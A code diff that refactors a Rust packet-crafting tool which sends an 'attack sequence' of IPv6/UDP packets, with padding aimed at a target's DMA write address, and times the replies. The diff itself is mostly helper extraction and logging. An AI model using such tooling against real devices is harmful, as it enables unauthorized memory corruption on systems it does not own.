@@ -2,6 +2,7 @@ use anyhow::{anyhow, bail, Context, Result};
 use clap::Parser;
 use log::info;
 use pnet::{
+    datalink::DataLinkReceiver,
     ipnetwork::IpNetwork,
     packet::{
         ethernet::{
@@ -20,6 +21,8 @@ use std::{
     str::FromStr,
     time::{Duration, Instant},
 };
+
+const SOURCE_PORT: u16 = 2000;
 
 /// Simple program to greet a person
 #[derive(Parser, Debug)]
@@ -66,9 +69,9 @@ impl Builder {
         // Build from the bottom up, so that each buffer is exactly the right size
         let mut udp =
             MutableUdpPacket::owned(vec![0u8; payload_len as usize]).unwrap();
-        udp.set_source(2000);
+        udp.set_source(SOURCE_PORT);
         udp.set_destination(7777); // our target port
-        udp.set_payload(&data);
+        udp.set_payload(data);
         udp.set_length(payload_len); // UDP header length
         let udp_chk = pnet::packet::udp::ipv6_checksum(
             &udp.to_immutable(),
@@ -138,6 +141,30 @@ impl Builder {
     }
 }
 
+fn receive_udp(
+    receiver: &mut dyn DataLinkReceiver,
+    timeout: Duration,
+) -> Option<(Vec<u8>, Instant)> {
+    let start = Instant::now();
+    while Instant::now() - start < timeout {
+        let Ok(rx) = receiver.next() else {
+            continue;
+        };
+        let rx_time = Instant::now();
+        let packet = EthernetPacket::new(rx).unwrap();
+        if EtherTypes::Ipv6 == packet.get_ethertype() {
+            let header = Ipv6Packet::new(packet.payload()).unwrap();
+            if IpNextHeaderProtocols::Udp == header.get_next_header() {
+                let udp = UdpPacket::new(header.payload()).unwrap();
+                if udp.get_destination() == SOURCE_PORT {
+                    return Some((udp.payload().to_owned(), rx_time));
+                }
+            }
+        }
+    }
+    None
+}
+
 fn main() -> Result<()> {
     env_logger::Builder::from_env(
         env_logger::Env::default().default_filter_or("info"),
@@ -146,7 +173,7 @@ fn main() -> Result<()> {
 
     // Open a bogus socket to listen on port 2000, which prevents the OS from
     // replying with ICMPv6 messages about the port being unreachable.
-    let socket = std::net::UdpSocket::bind("[::]:2000")?;
+    let _socket = std::net::UdpSocket::bind(format!("[::]:{SOURCE_PORT}"))?;
 
     let args = Args::parse();
     let dest_mac = MacAddr::from_str(&args.mac)
@@ -171,8 +198,6 @@ fn main() -> Result<()> {
         .ok_or_else(|| anyhow!("could not get IPv6 address from interface"))?;
 
     // HERE WE GO
-    let data = vec![b'1'];
-
     let builder = Builder {
         source_ip,
         source_mac,
@@ -188,9 +213,8 @@ fn main() -> Result<()> {
     // DMA write address.
     let mut packets = vec![];
     for i in 1..6 {
-        let mut data: Vec<u8> =
-            format!("data-{i}").as_bytes().iter().cloned().collect();
-        for p in 0..46 {
+        let mut data: Vec<u8> = format!("data-{i}").as_bytes().to_vec();
+        for _p in 0..46 {
             // found experimentally
             data.push(b'0');
         }
@@ -201,8 +225,10 @@ fn main() -> Result<()> {
         packets.push(eth);
     }
 
-    let mut cfg = pnet::datalink::Config::default();
-    cfg.read_timeout = Some(Duration::from_millis(100));
+    let cfg = pnet::datalink::Config {
+        read_timeout: Some(Duration::from_millis(100)),
+        ..Default::default()
+    };
     let (mut sender, mut receiver) =
         match pnet::datalink::channel(&interface, cfg)? {
             pnet::datalink::Channel::Ethernet(tx, rx) => (tx, rx),
@@ -210,67 +236,31 @@ fn main() -> Result<()> {
         };
 
     // Send a friendly packet to ensure that we're in the target's NDP tables
+    info!("sending initial packet to populate NDP tables");
     let (udp, payload_len, tag) = builder.udp(&[0]);
     let (ipv6, ethertype) = builder.ipv6(udp, payload_len, tag);
     let hello_packet = builder.eth(ipv6, ethertype);
     sender.send_to(hello_packet.packet(), None);
-    loop {
-        let Ok(rx) = receiver.next() else {
-            continue;
-        };
-        let rx_time = Instant::now();
-        let packet = EthernetPacket::new(rx).unwrap();
-        if EtherTypes::Ipv6 == packet.get_ethertype() {
-            let header = Ipv6Packet::new(packet.payload()).unwrap();
-            if IpNextHeaderProtocols::Udp == header.get_next_header() {
-                let udp = UdpPacket::new(header.payload()).unwrap();
-                if udp.get_destination() == 2000 {
-                    println!(
-                        "got reply: {header:?} {udp:?} {:x?}",
-                        udp.payload()
-                    );
-                    break;
-                }
-            }
-        }
-    }
+    let (reply, _rx_time) =
+        receive_udp(receiver.as_mut(), Duration::from_millis(500))
+            .ok_or_else(|| anyhow!("timeout waiting for rx"))?;
+    info!("received reply from hello packet: {reply:?}");
 
     // Send our attack sequence
+    info!("sending attack sequence");
     let send_start = Instant::now();
     sender.send_to(delay_packet.packet(), None);
     let send_end = Instant::now();
     for p in packets {
         sender.send_to(p.packet(), None);
     }
+    let (reply, rx_time) =
+        receive_udp(receiver.as_mut(), Duration::from_millis(500))
+            .ok_or_else(|| anyhow!("timeout waiting for rx"))?;
+    info!("received reply from delay packet: {reply:?}");
 
-    loop {
-        let Ok(rx) = receiver.next() else {
-            continue;
-        };
-        let rx_time = Instant::now();
-        let packet = EthernetPacket::new(rx).unwrap();
-        if EtherTypes::Ipv6 == packet.get_ethertype() {
-            let header = Ipv6Packet::new(packet.payload()).unwrap();
-            if IpNextHeaderProtocols::Udp == header.get_next_header() {
-                let udp = UdpPacket::new(header.payload()).unwrap();
-                if udp.get_destination() == 2000 {
-                    println!(
-                        "got reply: {header:?} {udp:?} {:x?}",
-                        udp.payload()
-                    );
-                    println!(
-                        "time since send called:   {:?}",
-                        rx_time - send_end
-                    );
-                    println!(
-                        "time since send returned: {:?}",
-                        rx_time - send_start
-                    );
-                    break;
-                }
-            }
-        }
-    }
+    info!("time since send called:   {:?}", rx_time - send_end);
+    info!("time since send returned: {:?}", rx_time - send_start);
 
     Ok(())
 }
